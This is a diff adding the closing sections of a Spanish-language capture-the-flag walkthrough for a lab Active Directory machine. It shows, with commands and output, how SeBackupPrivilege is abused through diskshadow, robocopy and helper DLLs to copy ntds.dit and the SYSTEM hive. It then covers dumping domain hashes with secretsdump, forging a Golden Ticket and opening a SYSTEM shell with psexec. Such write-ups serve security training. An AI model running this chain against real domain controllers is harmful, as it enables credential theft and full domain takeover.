-El problema aqui es que el **archivo ntds.dit** esta en uso, lo que nos complica el poder copiarlo, pues dicho archivo permanece bloqueado por el SO para prevenir su acceso directo.
+El problema aquí es que el **archivo ntds.dit** está en uso, lo que nos complica el poder copiarlo, pues dicho archivo permanece bloqueado por el SO para prevenir su acceso directo.
 
 Para aplicar un bypass a esto, necesitamos usar la función **diskshadow** y un archivo **Distributed Shell (DSH)**:
 
@@ -1059,7 +1149,7 @@ add volume c: alias berserk
 create
 expose %berserk% z:
 ```
-Puedes modificar los nombres berserk para que este tu alias.
+Puedes modificar los nombres berserk para que esté tu alias.
 
 Ahora, tenemos que usar la herramienta **unix2dos** sobre nuestro **archivo DSH**, pues convierte la codificación y el espaciado del **archivo DSH** a un formato compatible con la **máquina Windows**, lo que garantiza una ejecución sin problemas.
 ```bash
@@ -1068,52 +1158,364 @@ unix2dos: convirtiendo archivo berserk.dsh a formato DOS..
 ```
 Listo.
 
-Apliquemos ambos metodos.
+Apliquemos ambos métodos.
 
 <br>
 
-<h3 id="Hashes1">Metodo 1: Copiando Archivos ntds.dit y SYSTEM</h3>
+<h3 id="Hashes1">Metodo 1: Copiando Archivo ntds.dit con diskshadow y SYSTEM con reg save</h3>
 
-
-```bash
-
+Crea un directorio temporal y carga el **archivo DSH** a la sesión de **evil-winrm**:
+```batch
+*Evil-WinRM* PS C:\Users\thomas.brown\Documents> cd C:\
+*Evil-WinRM* PS C:\> mkdir Temp
+*Evil-WinRM* PS C:\Temp> upload berserk.dsh
+Info: Uploading /../TheHackersLabs/BlackGold/content/berserk.dsh to C:\Temp\berserk.dsh
+Data: 120 bytes of 120 bytes copied
+Info: Upload successful!
 ```
 
-```bash
+Ejecuta el **archivo DSH** con **diskshadow**:
+```batch
+*Evil-WinRM* PS C:\Temp> diskshadow /s berserk.dsh
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  5/15/2025 5:21:46 AM
 
+-> set context persistent nowriters
+-> add volume c: alias berserk
+-> create
+Alias berserk for shadow ID {5c1763ce-df77-4fb5-87b4-751afe688ffa} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {24ff74c8-8965-450d-8d1f-5ffc00373b3b} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {24ff74c8-8965-450d-8d1f-5ffc00373b3b}
+
+	* Shadow copy ID = {5c1763ce-df77-4fb5-87b4-751afe688ffa}		%berserk%
+		- Shadow copy set: {24ff74c8-8965-450d-8d1f-5ffc00373b3b}	%VSS_SHADOW_SET%
+		- Original count of shadow copies = 1
+		- Original volume name: \\?\Volume{c2f9909f-0000-0000-0000-100000000000}\ [C:\]
+		- Creation time: 5/15/2025 5:21:47 AM
+		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
+		- Originating machine: DC01.neptune.thl
+		- Service machine: DC01.neptune.thl
+		- Not exposed
+		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+		- Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %berserk% z:
+-> %berserk% = {5c1763ce-df77-4fb5-87b4-751afe688ffa}
+The  drive letter is already in use.
+```
+Observa que se ejecutan los comandos que metimos en el **archivo DSH**. Esto creó la copia del **Disco C** dentro del **Disco Z**, indicado en el **archivo DSH**.
+
+Ahora, copia el **archivo ntds.dit** del **Disco Z** con la herramienta **robocopy**:
+```batch
+*Evil-WinRM* PS C:\Temp> robocopy /b z:\windows\ntds . ntds.dit
+.
+-------------------------------------------------------------------------------
+   ROBOCOPY     ::     Robust File Copy for Windows
+-------------------------------------------------------------------------------
+...
+ 99.6%
+100%
+100%
+...
+   Speed :           26,504,290 Bytes/sec.
+   Speed :            1,516.588 MegaBytes/min.
 ```
 
-```bash
-
+Ya solo falta copiar el **archivo System Hive** con **reg save**:
+```batch
+*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
+The operation completed successfully.
 ```
 
-```bash
+Podemos revisar que existen los **archivos ntds.dit y system**:
+```batch
+*Evil-WinRM* PS C:\Temp> dir
+.
+    Directory: C:\Temp
+.
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/15/2025   5:21 AM            614 2025-05-15_5-21-48_DC01.cab
+-a----         5/15/2025   3:35 AM             92 berserk.dsh
+-a----         2/26/2025   8:31 PM       16777216 ntds.dit
+-a----         5/15/2025   5:23 AM       15773696 system
+```
 
+Descarga estos dos archivos:
+```batch
+*Evil-WinRM* PS C:\Temp> download system
+Info: Downloading C:\Temp\system to system
+Info: Download successful!
+*Evil-WinRM* PS C:\Temp> download ntds.dit
+Info: Downloading C:\Temp\ntds.dit to ntds.dit
+Info: Download successful!
+```
+
+Y con la herramienta **impacket-secretsdump**, dumpeamos todos los hashes del **archivo ntds.dit y system hive**:
+```bash
+impacket-secretsdump -ntds ntds.dit -system system local
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x9a6eda47674d4ed68313ddc1c8f9ca5b
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 5e8a0e9e33e9b3e49f0767e39f3e7d29
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b43......
+.....
+.....
+.....
 ```
 
 <br>
 
-<h3 id="Hashes2">Metodo 2: Copiando Archivos ntds.dit y SYSTEM</h3>
+<h3 id="Hashes2">Metodo 2: Copiando Archivos ntds.dit y SYSTEM Usando Archivos DLL</h3>
 
+Para este método, necesitamos dos **archivos DLL** que nos ayudan a crear backups del **archivo ntds.dit y system**.
 
-<a href="https://github.com/giuliano108/SeBackupPrivilege?tab=readme-ov-file" target="_blank">Repositorio de giuliano108: SeBackupPrivilege</a>
+Estos los puedes descargar del siguiente repositorio (se encuentran al casi al final):
+* <a href="https://github.com/giuliano108/SeBackupPrivilege?tab=readme-ov-file" target="_blank">Repositorio de giuliano108: SeBackupPrivilege</a>
 
-```bash
-
+Una vez que los descargues, cárgalos a la sesión de **evil-winrm** y también el **archivo DSH**:
+```batch
+*Evil-WinRM* PS C:\Temp> upload SeBackupPrivilegeCmdLets.dll
+*Evil-WinRM* PS C:\Temp> upload SeBackupPrivilegeUtils.dll
+*Evil-WinRM* PS C:\Temp> upload berserk.dsh
 ```
 
-```bash
-
+Importa los dos **archivos DLL** a la sesión:
+```batch
+*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeUtils.dll
+*Evil-WinRM* PS C:\Temp> Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
 
-```bash
+Ejecuta el **archivo DSH** con **diskshadow**:
+```batch
+*Evil-WinRM* PS C:\Temp> diskshadow /s berserk.dsh
+Microsoft DiskShadow version 1.0
+Copyright (C) 2013 Microsoft Corporation
+On computer:  DC01,  5/15/2025 5:49:36 AM
 
+-> set context persistent nowriters
+-> add volume c: alias berserk
+-> create
+Alias berserk for shadow ID {17343110-dc4e-4cdb-85e9-fd0d35943e06} set as environment variable.
+Alias VSS_SHADOW_SET for shadow set ID {a13ee0f8-6585-4e73-9e13-7696e6b73474} set as environment variable.
+
+Querying all shadow copies with the shadow copy set ID {a13ee0f8-6585-4e73-9e13-7696e6b73474}
+
+	* Shadow copy ID = {17343110-dc4e-4cdb-85e9-fd0d35943e06}		%berserk%
+		- Shadow copy set: {a13ee0f8-6585-4e73-9e13-7696e6b73474}	%VSS_SHADOW_SET%
+		- Original count of shadow copies = 1
+		- Original volume name: \\?\Volume{c2f9909f-0000-0000-0000-100000000000}\ [C:\]
+		- Creation time: 5/15/2025 5:49:37 AM
+		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3
+		- Originating machine: DC01.neptune.thl
+		- Service machine: DC01.neptune.thl
+		- Not exposed
+		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
+		- Attributes:  No_Auto_Release Persistent No_Writers Differential
+
+Number of shadow copies listed: 1
+-> expose %berserk% z:
+-> %berserk% = {17343110-dc4e-4cdb-85e9-fd0d35943e06}
+The  drive letter is already in use.
 ```
 
-```bash
-
+Ahora, usamos el **cmdlet Copy-FileSebackupPrivilege**, que es parte de los **archivos DLL** que importamos antes, para copiar el **archivo ntds.dit**:
+```batch
+*Evil-WinRM* PS C:\Temp> Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
 ```
 
+Ya solo falta copiar el **archivo System Hive** con **reg save**:
+```batch
+*Evil-WinRM* PS C:\Temp> reg save hklm\system c:\Temp\system
+The operation completed successfully.
+```
+
+Puedes revisar que ya tenemos el **archivo ntds.dit y el system hive**:
+```batch
+*Evil-WinRM* PS C:\Temp> dir
+.
+    Directory: C:\Temp
+.
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         5/15/2025   5:49 AM            613 2025-05-15_5-49-37_DC01.cab
+-a----         5/15/2025   3:35 AM             92 berserk.dsh
+-a----         5/15/2025   5:52 AM       16777216 ntds.dit
+-a----         5/15/2025   5:47 AM          12288 SeBackupPrivilegeCmdLets.dll
+-a----         5/15/2025   5:47 AM          16384 SeBackupPrivilegeUtils.dll
+-a----         5/15/2025   5:52 AM       15773696 system
+```
+
+Descarga estos dos archivos:
+```batch
+*Evil-WinRM* PS C:\Temp> download system
+Info: Downloading C:\Temp\system to system
+Info: Download successful!
+*Evil-WinRM* PS C:\Temp> download ntds.dit
+Info: Downloading C:\Temp\ntds.dit to ntds.dit
+Info: Download successful!
+```
+
+Y con la herramienta **impacket-secretsdump**, volvemos a dumpear todos los hashes del **archivo ntds.dit y system hive**:
+```bash
+impacket-secretsdump -ntds ntds.dit -system system local
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x9a6eda47674d4ed68313ddc1c8f9ca5b
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 5e8a0e9e33e9b3e49f0767e39f3e7d29
+[*] Reading and decrypting hashes from ntds.dit 
+Administrator:500:aad3b43......
+.....
+.....
+.....
+```
+
+Comprobemos que funciona el **Hash del Administrador** con **crackmapexec**:
+```bash
+crackmapexec smb 192.168.56.10 -u 'Administrator' -H 'Hash_NTLM o Hash NT'
+SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:neptune.thl) (signing:True) (SMBv1:False)
+SMB         192.168.56.10   445    DC01             [-] neptune.thl\Administrator:*********** STATUS_LOGON_FAILURE
+```
+Parece que el Hash no está funcionando, posiblemente hay alguna regla que esté impidiendo que utilicemos el **Hash del Administrador**, lo que nos impedirá loguearnos en la máquina víctima aplicando **Pass-The-Hash**.
+
+Podemos aplicar el **Golden Ticket Attack**, para suplantar al **Administrador** y evadir cualquier restricción que nos esté bloqueando.
+
+<br>
+
+<h2 id="GoldenTicket">Creando Golden Ticket para Autenticarnos Vía Kerberos como Administrador</h2>
+
+¿Qué es el **Golden Ticket Attack**?
+
+| **Golden Ticket Attack** |
+|:-----------:|
+| *El Golden Ticket Attack es una técnica avanzada de post-explotación que permite a un atacante crear un ticket Kerberos TGT (Ticket Granting Ticket) falso y utilizarlo para obtener acceso ilimitado a recursos dentro de un dominio Active Directory.* |
+
+<br>
+
+Para crear el **Golden Ticket**, necesitamos lo siguiente:
+* La herramienta **impacket-ticketer**.
+* El **SID** del dominio.
+* El **Hash NT** de quien vamos a suplantar.
+
+El **SID** del dominio, lo podemos obtener con la herramienta **impacket-getPac**:
+```bash
+impacket-getPac -targetUser 'thomas.brown' neptune.thl/'thomas.brown:newP@ssword2022'
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+...
+...
+ResourceGroupIds:                NULL 
+Domain SID: S-1-5-21-4221554869-2967981397-3876651103
+```
+Y como ya tenemos el **Hash NT** del administrador, ya solamente tenemos que agregar lo demás.
+
+A la herramienta **impacket-ticketer**, le indicamos el **Hash NT** (`-nthash`), el usuario a suplantar (`-user`), el grupo al que pertenece el usuario que sería 500 para el administrador (`groups`), el **SID** del dominio (`-domain-sid`), el dominio (`-domain`), la IP de la máquina (`-dc-ip`) y el objetivo que es el **Administrator**:
+```bash
+impacket-ticketer -nthash 'Hash_NT_de_Administador' -user 'Administrator' -groups 500 -domain-sid 'S-1-5-21-4221554869-2967981397-3876651103' -domain neptune.thl -dc-ip 192.168.56.10 Administrator
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+.
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for neptune.thl/Administrator
+[*] 	PAC_LOGON_INFO
+[*] 	PAC_CLIENT_INFO_TYPE
+[*] 	EncTicketPart
+[*] 	EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*] 	PAC_SERVER_CHECKSUM
+[*] 	PAC_PRIVSVR_CHECKSUM
+[*] 	EncTicketPart
+[*] 	EncASRepPart
+[*] Saving ticket in Administrator.ccache
+```
+Ya tenemos el archivo **Administrator.ccache**.
+
+Tenemos que exportarlo como variable de entorno:
+```bash
+export KRB5CCNAME=Administrator.ccache
+```
+
+Podemos comprobar que ya está cargado el archivo **Administrator.ccache** como variable de entorno con la herramienta **klist**:
+```bash
+klist
+Ticket cache: FILE:Administrator.ccache
+Default principal: Administrator@NEPTUNE.THL
+
+Valid starting     Expires            Service principal
+15/05/25 00:12:39  13/05/35 00:12:39  krbtgt/NEPTUNE.THL@NEPTUNE.THL
+	renew until 13/05/35 00:12:39
+```
+Excelente, ya está cargado.
+
+Y antes de usar **impacket-psexec** para entrar a la máquina, tenemos que revisar un par de cosillas.
+
+Primero, que el dominio esté bien registrado en el `/etc/hosts`:
+```bash
+nano /etc/hosts
+---------------
+192.168.56.10 neptune.thl DC01.neptune.thl
+```
+
+Configuramos temporalmente un **DNS** para el DC de la máquina víctima en el archivo `/etc/resolv.conf`:
+```bash
+nano /etc/resolv.conf
+--------------------
+nameserver 192.168.56.10
+```
+
+Y nos ponemos temporalmente en el mismo horario que esté la máquina víctima con la herramienta **ntpdate**:
+```bash
+ntpdate -u DC01.neptune.thl
+2025-05-15 03:15:33.559101 (-0600) +326.476510 +/- 0.000732 DC01.neptune.thl 192.168.56.10 s1 no-leap
+CLOCK: time stepped by 326.476510
+```
+
+Si todo está bien configurado, si usas **nslookup** para probar el DNS del DC, nos tendría que resolver y mostrar su información:
+```bash
+nslookup DC01.neptune.thl
+Server:         192.168.56.10
+Address:        192.168.56.10#53
+
+Name:   DC01.neptune.thl
+Address: 192.168.56.10
+```
+
+Ya con todo esto, nos logueamos en la máquina víctima con **impacket-psexec**, indicándole que será por **Kerberos** (`-k`), sin contraseña (`-no-pass`), el dominio y el usuario junto al nombre del servidor DC:
+```batch
+impacket-psexec -k -no-pass neptune.thl/Administrator@DC01.neptune.thl
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on DC01.neptune.thl.....
+[*] Found writable share ADMIN$
+[*] Uploading file XZzsOXdt.exe
+[*] Opening SVCManager on DC01.neptune.thl.....
+[*] Creating service XFYR on DC01.neptune.thl.....
+[*] Starting service XFYR.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.587]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> 
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+Funcionó correctamente.
+
+Busca la última flag que nos falta:
+```batch
+C:\> cd Users\Administrator\Desktop
+.
+C:\Users\Administrator\Desktop> type root.txt
+...
+```
+Y con esto, terminamos la máquina.
 
 
 <br>
@@ -1123,11 +1525,11 @@ Apliquemos ambos metodos.
 </div>
 
 
-* 
-* 
+* https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
 * https://github.com/SpecterOps/BloodHound-Legacy/releases/tag/v4.3.1
 * https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
 * https://github.com/giuliano108/SeBackupPrivilege?tab=readme-ov-file
+* https://www.picussecurity.com/resource/blog/golden-ticket-attack-mitre-t1558.001
 
 
 <br>
